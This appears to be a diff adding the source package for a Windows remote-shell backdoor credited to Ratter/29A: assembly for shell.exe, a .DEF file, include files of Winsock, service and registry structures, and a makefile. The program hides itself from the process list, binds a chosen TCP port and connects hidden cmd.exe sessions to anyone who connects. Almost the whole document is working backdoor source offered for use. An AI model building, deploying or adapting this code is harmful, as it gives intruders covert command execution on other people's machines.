@@ -1,0 +1,645 @@
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SHELL.ASM]ÄÄÄ
+; A little remote shell for NT boxes by Ratter/29A
+; syntax: shell.exe <port_to_bind_to>
+
+        .586p
+	.model	flat, stdcall
+	locals
+
+	include	useful.inc
+	include	win32api.inc
+	include	my_macroz.inc
+	include my_include.inc
+
+	STARTF_USESHOWWINDOW	equ	00000001h
+	STARTF_USESTDHANDLES	equ	00000100h
+
+
+pipe	struc
+	p_read	dd	?
+	p_write	dd	?
+pipe	ends
+
+
+	.data
+	_sin_		sockaddr_in	<AF_INET,,0100007fh,>
+	sec_attribz	dd	12
+			dd	0
+			dd	1
+
+        .code
+start:
+        pushad
+        @SEH_SetupFrame <jmp exit>
+        
+        @pushsz "kernel32.dll"
+	calle GetModuleHandleA
+	
+	@pushsz "RegisterServiceProcess"
+	push eax
+	calle GetProcAddress
+	xchg eax, ecx
+	jecxz jump_over_hiding
+	
+	push 1
+	push 0
+	call ecx
+jump_over_hiding:
+
+
+        calle GetCommandLineA
+        xchg eax, edi
+
+	push edi
+	call go_until_gap
+	call go_over_gapz
+	pop edi
+	jc exit
+
+	call go_until_gap
+
+	call gimme_number_param
+	; here in eax the port number
+	push eax
+        calle htons
+        mov word ptr [_sin_.sin_port], ax
+
+	sub esp, 1000h
+	push esp
+	push 1
+	calle WSAStartup
+	add esp,1000h
+
+	push eax
+	push SOCK_STREAM
+	push AF_INET
+	calle socket
+	xchg eax, ebx
+
+	push type(sockaddr_in)
+	push offset _sin_
+	push ebx
+	calle bind
+
+	push eax
+	push ebx
+	calle listen
+
+accept_connection:
+	xor eax, eax
+
+	push eax
+	push eax
+	push ebx
+	calle accept
+
+	xor edx, edx
+	@pushvar <dd	?>
+	push edx
+	push eax
+	push offset shell_thread
+	push 16384
+	push edx
+	calle CreateThread
+
+	push eax
+	calle CloseHandle
+
+        jmp accept_connection
+
+
+close_socket:
+	push ebx
+	calle closesocket
+
+	calle WSACleanup
+exit:
+	@SEH_RemoveFrame
+	popad
+
+	push 0
+	calle ExitProcess
+
+
+go_over_gapz:
+	cmp byte ptr [edi], 0
+	stc
+	jz go_over_gapz_end
+        cmp byte ptr [edi], 20h
+	jz go_over_gapz_inc
+	jc go_over_gapz_inc
+go_over_gapz_end:
+	retn
+go_over_gapz_inc:
+	inc edi
+	jmp go_over_gapz
+
+go_until_gap:
+	cmp byte ptr [edi], 20h
+	jz go_until_gap_end
+	jc go_until_gap_end
+	inc edi
+	jmp go_until_gap
+go_until_gap_end:
+	retn
+
+gimme_param:
+	call go_over_gapz
+	mov esi, edi
+
+	call go_until_gap
+	and byte ptr [edi], 0
+	retn
+
+ascii_to_num:
+	push ecx
+	xor eax, eax
+	mov ecx, eax
+	
+ascii_to_num_loop:
+	lodsb
+	xor eax, '0'
+	
+	cmp eax, 10
+	jnc ascii_to_num_end
+	imul ecx, ecx, 10
+	add ecx, eax
+	jmp ascii_to_num_loop
+	
+ascii_to_num_end:
+	xchg eax, ecx
+	pop ecx
+	retn
+
+gimme_number_param:
+	call gimme_param
+	call ascii_to_num
+	mov edi, esi
+	retn
+
+shell_thread	proc	near	shandle:DWORD
+	local startup_info:STARTUPINFO
+	local process_info:PROCESS_INFORMATION
+	local pipe_in:pipe
+	local pipe_out:pipe
+	local fds:fd_set
+	local time_out:timeval
+	local bytes_to_read:DWORD
+
+	pushad
+	@SEH_SetupFrame <jmp shell_thread_end_>
+
+	push 0
+	push offset sec_attribz
+	lea eax, [pipe_in.p_write]
+	push eax
+	lea eax, [pipe_in.p_read]
+	push eax
+	calle CreatePipe
+
+	push 0
+	push offset sec_attribz
+	lea eax, [pipe_out.p_write]
+	push eax
+	lea eax, [pipe_out.p_read]
+	push eax
+	calle CreatePipe
+
+	lea eax, [startup_info]
+	push eax
+	calle GetStartupInfoA
+
+	lea esi, [startup_info]
+	mov eax, dword ptr [pipe_in.p_write]
+	mov dword ptr [esi.hStdOutput], eax
+	mov dword ptr [esi.hStdError], eax
+
+	mov eax, dword ptr [pipe_out.p_read]
+	mov dword ptr [esi.hStdInput], eax
+
+	mov dword ptr [esi.dwFlags], STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES
+	and word ptr [esi.wShowWindow], 0
+
+	xor edx, edx
+        lea eax, [process_info]
+	push eax
+	push esi
+	push edx
+	push edx
+	push edx
+	push 1
+	push edx
+	push edx
+	@pushsz "cmd.exe"
+	push edx
+        calle CreateProcessA
+        calle GetLastError
+
+	push dword ptr [pipe_in.p_write]
+	calle CloseHandle
+	push dword ptr [pipe_out.p_read]
+	calle CloseHandle
+
+	push 2048
+	push GMEM_ZEROINIT
+        calle GlobalAlloc
+        xchg eax, edi
+
+shell_thread_main_loop:
+        @pushvar <dd	?>
+        @pushvar <dd	?>
+	lea eax, [bytes_to_read]
+	push eax
+        push 2048
+        push edi
+        push dword ptr [pipe_in.p_read]
+        calle PeekNamedPipe
+        test eax, eax
+        jz shell_thread_end
+
+        cmp dword ptr [bytes_to_read], 0
+        jz check_user_input
+
+        ;
+        push 0
+	lea eax, [bytes_to_read]
+	push eax	
+	push dword ptr [bytes_to_read]
+	push edi
+	push dword ptr [pipe_in.p_read]
+	calle ReadFile
+	xchg eax, ecx
+	jecxz shell_thread_end
+
+
+        push 0
+        push dword ptr [bytes_to_read]
+        push edi
+        push dword ptr [shandle]
+        calle send
+	xchg eax, ecx
+	jecxz shell_thread_end
+
+        ;
+
+check_user_input:
+        lea ecx, [time_out]
+	mov dword ptr [ecx.tv_sec], 0
+	mov dword ptr [ecx.tv_usec], 500
+	
+        lea ebx, [fds]
+	mov dword ptr [ebx.fd_count], 1
+	push dword ptr [shandle]
+	pop dword ptr [ebx.fd_array]
+
+	xor eax, eax
+	push ecx
+	push eax
+	push eax
+	push ebx
+	push eax
+	calle select
+	xchg eax, ecx
+	jecxz shell_thread_sleep
+	inc ecx
+	jz shell_thread_end
+
+	;
+	push 0
+	push 2048
+	push edi
+	push dword ptr [shandle]
+	calle recv
+	xchg eax, ecx
+	jecxz shell_thread_end
+
+        push 0
+	@pushvar <dd	?>
+	push ecx
+	push edi
+	push dword ptr [pipe_out.p_write]
+	calle WriteFile
+	xchg eax, ecx
+	jecxz shell_thread_end
+	;
+
+shell_thread_sleep:
+	push 100
+	calle Sleep
+	jmp shell_thread_main_loop
+
+shell_thread_end:
+	push dword ptr [shandle]
+	calle closesocket
+
+	push dword ptr [pipe_in.p_read]
+	calle CloseHandle
+	push dword ptr [pipe_out.p_write]
+	calle CloseHandle
+
+shell_thread_end_:
+	@SEH_RemoveFrame
+	popad
+        leave
+	retn
+shell_thread	endp
+
+end	start
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SHELL.ASM]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SHELL.DEF]ÄÄÄ
+NAME         PREDLOHA WINDOWAPI
+
+DESCRIPTION  'Predloha'
+
+CODE         PRELOAD MOVEABLE DISCARDABLE
+DATA         PRELOAD MOVEABLE MULTIPLE
+
+EXETYPE      WINDOWS
+
+HEAPSIZE     131072
+STACKSIZE    131072
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SHELL.DEF]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MY_INCLUDE.INC]ÄÄÄ
+SERVICE_TABLE_ENTRY	struc
+	STE_ServiceName	dd	?
+	STE_ServiceProc	dd	?
+SERVICE_TABLE_ENTRY	ends
+
+SERVICE_STATUS		struc
+	SS_ServiceType			dd	?
+	SS_CurrentState			dd	?
+	SS_ControlsAccepted		dd	?
+	SS_Win32ExitCode		dd	?
+	SS_ServiceSpecificExitCode	dd	?
+	SS_CheckPoint			dd	?
+	SS_WaitHint			dd	?
+SERVICE_STATUS		ends
+
+OVERLAPPED		struc
+	O_Internal	dd	?
+	O_InternalHigh	dd	?
+	O_loffset	dd	?
+	O_OffsetHigh	dd	?
+	O_hEvent	dd	?
+OVERLAPPED		ends
+
+sockaddr_in	struc
+	sin_family	dw	?
+	sin_port	dw	?
+	sin_addr	dd	?
+	sin_zero	db	8 dup (?)
+sockaddr_in	ends
+
+hostent		struc
+	h_name		dd	?
+	h_alias		dd	?
+	h_addr		dw	?
+	h_len		dw	?
+	h_list		dd	?
+hostent		ends
+
+timeval		struc
+	tv_sec	dd	?
+	tv_usec	dd	?
+timeval		ends
+
+fd_set		struc
+	fd_count	dd	?
+	fd_array	dd	?
+fd_set		ends
+
+RASCONNSTATUSA		struc
+	RCS_dwSize		dd	?
+	RCS_rasconnstate	dd	?
+	RCS_dwError		dd	?
+	RCS_szDeviceType	db 	16 + 1 dup(?)
+	RCS_szDeviceName	db	128 + 1 dup(?)
+RASCONNSTATUSA		ends
+
+_email_		struc
+	EM_MailFrom	dd	?	; pointer to ASCIIZ
+	EM_RcptTo	dd	?	; pointer to ASCIIZ
+	EM_Subject	dd	?	; pointer to ASCIIZ
+	EM_Message	dd	?	; pointer to ASCIIZ
+	EM_FilezNum	dd	?	; number of filez; if highest bit is set
+					; then in EM_Filez is a *.msg file
+	EM_Filez	dd	?	; pointer to ASCIIZ pointerz
+_email_		ends
+
+SYSTEMTIME	struc
+	ST_Year		dw	?
+	ST_Month	dw	?
+	ST_DayOfWeek	dw	?
+	ST_Day		dw	?
+	ST_Hour		dw	?
+	ST_Minute	dw	?
+	ST_Second	dw	?
+	ST_Milliseconds	dw	?
+SYSTEMTIME	ends
+
+oper		struc
+	OP_Oper		dd	?
+	OP_Rites	db	?	; 1 - RW; 0 - Ronly
+oper		ends
+
+@copy		macro	source
+	local	copy_end
+	local	copy_loop
+	push esi
+	mov esi, source
+copy_loop:
+	lodsb
+	test al, al
+	jz copy_end
+	stosb
+	jmp copy_loop
+copy_end:
+	pop esi
+endm
+
+@endsz_  	macro
+        local   nxtchr
+        push esi
+        mov esi, edi
+nxtchr:
+	lodsb
+	test al, al
+	jnz nxtchr
+	xchg esi, edi
+	pop esi
+endm
+
+@pushvar	macro	variable, empty
+	local   next_instr
+	ifnb <empty>
+	%out too much arguments in macro '@pushvar'
+	.err
+	endif
+	call next_instr
+	variable
+next_instr:
+endm
+
+	CR_LF				equ	0a0dh
+	WAIT_TIMEOUT			equ 	103h
+	SMTP_PORT			equ	25
+
+	SC_MANAGER_CONNECT		equ	1
+	SC_MANAGER_CREATE_SERVICE	equ	2
+	DELETE				equ	10000h
+	SERVICE_AUTO_START		equ	2
+	SERVICE_WIN32_OWN_PROCESS	equ	10h
+	SERVICE_ACCEPT_SHUTDOWN		equ	4
+	SERVICE_CONTROL_RUN		equ	0
+	CK_SERVICE_CONTROL		equ	0
+	CK_PIPE				equ	1
+	NO_ERROR			equ	0
+	
+	SERVICE_CONTROL_INTERROGATE	equ	4
+	SERVICE_CONTROL_SHUTDOWN	equ	5
+
+	SERVICE_STOPPED			equ	1
+	SERVICE_START_PENDING		equ	2
+	SERVICE_STOP_PENDING		equ	3
+	SERVICE_RUNNING			equ	4
+	SERVICE_CONTINUE_PENDING	equ	5
+	SERVICE_PAUSE_PENDING		equ	6
+	SERVICE_PAUSED			equ	7
+
+	PIPE_ACCESS_OUTBOUND		equ	2
+	PIPE_TYPE_BYTE			equ	0
+	FILE_FLAG_OVERLAPPED		equ	40000000h
+	
+	INFINITE			equ	-1
+	
+	AF_INET			equ	2
+	HEAP_ZERO_MEMORY	equ	8
+	SOCK_STREAM		equ	1
+	CR_LF			equ	0a0dh
+	MAX_ALLOWED_OPERZ	equ	5
+	SYNCHRONIZE		equ	100000h
+
+	RASCS_CONNECTED		equ	2000h
+	MOVEFILE_DELAY_UNTIL_REBOOT	equ	4
+	HKEY_LOCAL_MACHINE	equ	80000002h
+	KEY_ENUMERATE_SUB_KEYS	equ	8h
+	HKEY_USERS		equ	80000003h
+	KEY_QUERY_VALUE		equ	1
+	KEY_SET_VALUE		equ	2
+	REG_SZ			equ	1
+	REG_DWORD		equ	4
+	ERROR_NO_MORE_ITEMS	equ	259
+	
+	INET_THREADZ_COUNT	equ	2
+	INTERNET_OPEN_TYPE_DIRECT	equ	1
+
+	POP3_PORT		equ	110
+	OK			equ	" KO+"
+	ERROR			equ	"RRE-"
+	
+	SOXZ_PORT		equ	1080
+
+STARTUPINFO	STRUCT				;used by CreateProcessA API
+	cb		DWORD	?
+	lpReserved	DWORD	?
+	lpDesktop	DWORD	?
+	lpTitle		DWORD	?
+	dwX		DWORD	?
+	dwY		DWORD	?
+	dwXSize		DWORD	?
+	dwYSize		DWORD	?
+	dwXCountChars	DWORD	?
+	dwYCountChars	DWORD	?
+	dwFillAttribute	DWORD	?
+	dwFlags		DWORD	?
+	wShowWindow	WORD	?
+	cbReserved2	WORD	?
+	lpReserved2	DWORD	?
+	hStdInput	DWORD	?
+	hStdOutput	DWORD	?
+	hStdError	DWORD	?
+STARTUPINFO	ENDS
+PROCESS_INFORMATION	STRUCT
+	hProcess	DWORD	?
+	hThread		DWORD	?
+	dwProcessId	DWORD	?
+	dwThreadId	DWORD	?
+PROCESS_INFORMATION	ENDS
+
+	GMEM_ZEROINIT		equ	040h
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MY_INCLUDE.INC]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MY_MACROZ.INC]ÄÄÄ
+@pushvar	macro	variable, empty
+	local   next_instr
+	ifnb <empty>
+	%out too much arguments in macro '@pushvar'
+	.err
+	endif
+	call next_instr
+	variable
+next_instr:
+endm
+
+@messagebox	macro	message, empty
+	ifnb <empty>
+	%out too much arguments in macro '@pushvar'
+	.err
+	endif
+	push 0
+	@pushsz "Debug"
+	@pushsz <message>
+	push 0
+	call MessageBoxA
+endm
+
+calle	macro	api
+	extrn	api:PROC
+	call	api
+endm
+
+@gimme_delta	macro
+	local	gimme_delta
+        call gimme_delta
+gimme_delta:
+	mov esi, esp
+        lodsd
+        sub eax, offset gimme_delta
+	xchg eax, ebp
+        mov esp, esi
+endm
+
+calla	macro	api
+	call	dword ptr [ebp+api]
+endm
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MY_MACROZ.INC]ÄÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKEFILE]ÄÄÄ
+#       make                    Will build pemangle.exe
+#       make -B -DDEBUG         Will build the debug version of pemangle.exe
+
+NAME = shell
+OBJS = $(NAME).obj
+DEF  = $(NAME).def
+
+!if $d(DEBUG)
+TASMDEBUG=/zi /m
+LINKDEBUG=/v
+!else
+TASMDEBUG=/m
+LINKDEBUG=
+!endif
+
+!if $d(MAKEDIR)
+IMPORT=import32.lib          # Edit this to point your own library path
+!else
+IMPORT=import32.lib                # or put the file in the same directory
+!endif
+
+$(NAME).EXE: $(OBJS) $(DEF)
+  tlink32 /Tpe /aa /c /x $(LINKDEBUG) $(OBJS),$(NAME),, $(IMPORT), $(DEF)
+  pewrite.exe $(NAME).exe
+  del $(OBJS)
+
+.asm.obj:
+   tasm32 $(TASMDEBUG) /ml /i..\..\includes $&.asm
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKEFILE]ÄÄÄ
